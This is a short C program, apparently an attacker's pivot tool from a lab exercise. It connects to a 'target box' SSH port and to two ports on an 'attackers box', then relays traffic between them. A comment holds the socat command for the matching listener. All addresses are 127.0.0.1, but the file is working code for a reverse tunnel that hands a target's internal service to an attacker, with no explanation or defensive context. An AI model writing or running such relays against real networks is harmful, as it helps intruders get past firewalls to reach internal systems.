#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>

//socat -d -d -d tcp-l:31338,reuseaddr,bind=127.0.0.1,fork tcp-l:31337,bind=127.0.0.1,reuseaddr,retry=10

int main(void){
	//connect locally
	//AF_INET is 2
	//SOCK_STREAM is also 2
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr = {	.sin_family = AF_INET,
					.sin_addr.s_addr = inet_addr("127.0.0.1"),	//target box
					.sin_port = htons(2223)};	//ssh
	connect(sock, (struct sockaddr *)&addr, sizeof(addr));


	//connect other
	int sock2 = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr2 = {	.sin_family = AF_INET,
					.sin_addr.s_addr = inet_addr("127.0.0.1"),	//attackers box
					.sin_port = htons(31337)};	//gender bender
	connect(sock2, (struct sockaddr *)&addr2, sizeof(addr2));

	//connect pusher
	int sock3 = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr3 = {	.sin_family = AF_INET,
					.sin_addr.s_addr = inet_addr("127.0.0.1"),	//attackers box
					.sin_port = htons(31339)};	//gender bender
	connect(sock3, (struct sockaddr *)&addr3, sizeof(addr3));
	char boof[128];
	while(1){
		int res = recv(sock3, boof, 1, MSG_WAITALL);	//pusher
		res = recv(sock, boof, 128, MSG_DONTWAIT);
		if(res > 0) send(sock2, boof, res, 0);
		res = recv(sock2, boof, 128, MSG_DONTWAIT);
		if(res > 0) send(sock, boof, res, 0);
	}
	return 0;
}
